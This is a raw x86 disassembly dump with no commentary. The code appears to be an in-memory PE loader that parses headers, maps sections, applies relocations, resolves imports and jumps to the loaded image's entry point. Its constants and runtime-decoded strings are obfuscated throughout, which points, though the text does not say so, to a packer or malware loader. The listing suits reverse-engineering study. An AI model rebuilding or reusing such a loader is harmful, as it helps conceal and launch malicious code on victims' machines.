  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
